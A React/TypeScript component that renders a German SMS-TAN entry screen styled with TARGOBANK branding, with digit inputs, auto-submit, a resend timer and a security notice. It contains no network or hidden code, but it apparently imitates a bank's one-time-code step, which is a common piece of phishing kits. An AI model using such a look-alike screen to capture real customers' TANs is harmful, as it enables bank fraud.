import React, { useState, useEffect, useRef } from 'react';
import { MessageSquare, RefreshCw } from 'lucide-react';

interface SMSTANScreenProps {
  onSubmit: (tan: string) => void;
  onCancel?: () => void;
  onResend?: () => void;
  phoneNumber?: string;
  errorMessage?: string;
}

export const SMSTANScreen: React.FC<SMSTANScreenProps> = ({ 
  onSubmit,
  onCancel,
  onResend,
  phoneNumber = '***-***-**42',
  errorMessage
}) => {
  const [tan, setTan] = useState(['', '', '', '', '', '']);
  const [isMobile, setIsMobile] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [resendCooldown, setResendCooldown] = useState(0);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
    };

    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  useEffect(() => {
    // Focus first input on mount
    inputRefs.current[0]?.focus();
  }, []);

  useEffect(() => {
    if (resendCooldown > 0) {
      const timer = setTimeout(() => setResendCooldown(resendCooldown - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [resendCooldown]);

  const handleInputChange = (index: number, value: string) => {
    // Only allow numbers
    const numericValue = value.replace(/\D/g, '');
    
    if (numericValue.length <= 1) {
      const newTan = [...tan];
      newTan[index] = numericValue;
      setTan(newTan);
      
      // Auto-focus next input
      if (numericValue && index < 5) {
        inputRefs.current[index + 1]?.focus();
      }
      
      // Auto-submit when all digits entered
      if (numericValue && index === 5) {
        const fullTan = newTan.join('');
        if (fullTan.length === 6) {
          handleSubmit(fullTan);
        }
      }
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !tan[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
    
    if (pastedData.length > 0) {
      const newTan = [...tan];
      for (let i = 0; i < pastedData.length && i < 6; i++) {
        newTan[i] = pastedData[i];
      }
      setTan(newTan);
      
      // Focus appropriate input
      if (pastedData.length === 6) {
        inputRefs.current[5]?.focus();
        handleSubmit(pastedData);
      } else {
        inputRefs.current[pastedData.length]?.focus();
      }
    }
  };

  const handleSubmit = async (tanValue?: string) => {
    const fullTan = tanValue || tan.join('');
    if (fullTan.length !== 6) return;
    
    setIsLoading(true);
    try {
      await onSubmit(fullTan);
    } finally {
      setIsLoading(false);
    }
  };

  const handleResend = () => {
    if (resendCooldown > 0 || !onResend) return;
    
    onResend();
    setResendCooldown(60);
    setTan(['', '', '', '', '', '']);
    inputRefs.current[0]?.focus();
  };

  return (
    <div style={{
      backgroundColor: '#f8f9fa',
      minHeight: '80vh',
      padding: isMobile ? '40px 20px' : '80px 40px',
      fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center'
    }}>
      <div style={{
        maxWidth: '500px',
        margin: '0 auto',
        textAlign: 'center',
        backgroundColor: 'white',
        borderRadius: '12px',
        padding: isMobile ? '40px 24px' : '50px 48px',
        boxShadow: '0 8px 32px rgba(0, 0, 0, 0.1)'
      }}>
        {/* SMS Icon */}
        <div style={{
          marginBottom: '32px',
          display: 'flex',
          justifyContent: 'center'
        }}>
          <div style={{
            width: '100px',
            height: '100px',
            borderRadius: '50%',
            backgroundColor: '#e3f2fd',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center'
          }}>
            <MessageSquare size={50} color="#00b6ed" />
          </div>
        </div>

        {/* Title */}
        <h1 style={{
          color: '#003366',
          fontSize: isMobile ? '24px' : '28px',
          fontWeight: '900',
          margin: '0 0 16px 0',
          fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
        }}>
          SMS-TAN eingeben
        </h1>

        {/* Message */}
        <p style={{
          color: '#666',
          fontSize: isMobile ? '16px' : '18px',
          lineHeight: '1.6',
          margin: '0 0 8px 0',
          fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
        }}>
          Wir haben einen 6-stelligen Code an
        </p>
        <p style={{
          color: '#003366',
          fontSize: isMobile ? '18px' : '20px',
          fontWeight: 'bold',
          margin: '0 0 32px 0',
          fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
        }}>
          {phoneNumber}
        </p>

        {/* Error Message */}
        {errorMessage && (
          <div style={{
            backgroundColor: '#fff3cd',
            border: '1px solid #ffeaa7',
            borderRadius: '8px',
            padding: '12px 16px',
            marginBottom: '24px',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            gap: '8px'
          }}>
            <span style={{ fontSize: '16px' }}>⚠️</span>
            <span style={{
              color: '#856404',
              fontSize: '14px',
              fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
            }}>
              {errorMessage}
            </span>
          </div>
        )}

        {/* TAN Input Fields */}
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          gap: isMobile ? '8px' : '12px',
          marginBottom: '32px'
        }}>
          {tan.map((digit, index) => (
            <input
              key={index}
              ref={el => inputRefs.current[index] = el}
              type="text"
              inputMode="numeric"
              maxLength={1}
              value={digit}
              onChange={(e) => handleInputChange(index, e.target.value)}
              onKeyDown={(e) => handleKeyDown(index, e)}
              onPaste={index === 0 ? handlePaste : undefined}
              style={{
                width: isMobile ? '44px' : '52px',
                height: isMobile ? '52px' : '60px',
                border: errorMessage ? '2px solid #dc3545' : '2px solid #ddd',
                borderRadius: '8px',
                fontSize: '24px',
                fontWeight: 'bold',
                textAlign: 'center',
                fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif',
                outline: 'none',
                transition: 'border-color 0.3s',
                backgroundColor: 'white'
              }}
              onFocus={(e) => {
                e.currentTarget.style.borderColor = '#00b6ed';
                e.currentTarget.select();
              }}
              onBlur={(e) => {
                e.currentTarget.style.borderColor = errorMessage ? '#dc3545' : '#ddd';
              }}
            />
          ))}
        </div>

        {/* Submit Button */}
        <button
          onClick={() => handleSubmit()}
          disabled={isLoading || tan.join('').length !== 6}
          style={{
            backgroundColor: tan.join('').length === 6 ? '#c20831' : '#ccc',
            color: 'white',
            border: 'none',
            borderRadius: '50px',
            padding: '14px 40px',
            fontSize: '16px',
            fontWeight: 'bold',
            fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif',
            cursor: (isLoading || tan.join('').length !== 6) ? 'not-allowed' : 'pointer',
            transition: 'all 0.3s ease',
            width: '100%',
            maxWidth: '300px',
            boxShadow: tan.join('').length === 6 ? '0 6px 20px rgba(194, 8, 49, 0.3)' : 'none',
            opacity: isLoading ? 0.7 : 1,
            marginBottom: '16px'
          }}
          onMouseOver={(e) => {
            if (!isLoading && tan.join('').length === 6) {
              e.currentTarget.style.backgroundColor = '#a91e2c';
              e.currentTarget.style.transform = 'translateY(-2px)';
            }
          }}
          onMouseOut={(e) => {
            if (!isLoading && tan.join('').length === 6) {
              e.currentTarget.style.backgroundColor = '#c20831';
              e.currentTarget.style.transform = 'translateY(0)';
            }
          }}
        >
          {isLoading ? 'Wird überprüft...' : 'Bestätigen'}
        </button>

        {/* Resend Link */}
        {onResend && (
          <div style={{ marginBottom: '16px' }}>
            <button
              onClick={handleResend}
              disabled={resendCooldown > 0}
              style={{
                background: 'none',
                border: 'none',
                color: resendCooldown > 0 ? '#999' : '#00b6ed',
                fontSize: '14px',
                fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif',
                cursor: resendCooldown > 0 ? 'not-allowed' : 'pointer',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '8px',
                margin: '0 auto'
              }}
            >
              <RefreshCw size={16} />
              {resendCooldown > 0 
                ? `Erneut senden in ${resendCooldown}s`
                : 'Code erneut senden'
              }
            </button>
          </div>
        )}

        {/* Cancel Button */}
        {onCancel && (
          <button
            onClick={onCancel}
            style={{
              backgroundColor: 'transparent',
              color: '#666',
              border: '2px solid #ddd',
              borderRadius: '50px',
              padding: '12px 32px',
              fontSize: '14px',
              fontWeight: '500',
              fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif',
              cursor: 'pointer',
              transition: 'all 0.3s ease'
            }}
            onMouseOver={(e) => {
              e.currentTarget.style.borderColor = '#003366';
              e.currentTarget.style.color = '#003366';
            }}
            onMouseOut={(e) => {
              e.currentTarget.style.borderColor = '#ddd';
              e.currentTarget.style.color = '#666';
            }}
          >
            Abbrechen
          </button>
        )}

        {/* Security Note */}
        <div style={{
          marginTop: '32px',
          paddingTop: '20px',
          borderTop: '1px solid #e0e0e0'
        }}>
          <p style={{
            color: '#666',
            fontSize: '12px',
            margin: '0',
            fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif',
            lineHeight: '1.5'
          }}>
            Geben Sie den Code niemals an Dritte weiter. TARGOBANK Mitarbeiter werden Sie niemals nach dem vollständigen Code fragen.
          </p>
        </div>
      </div>
    </div>
  );
};

export default SMSTANScreen;

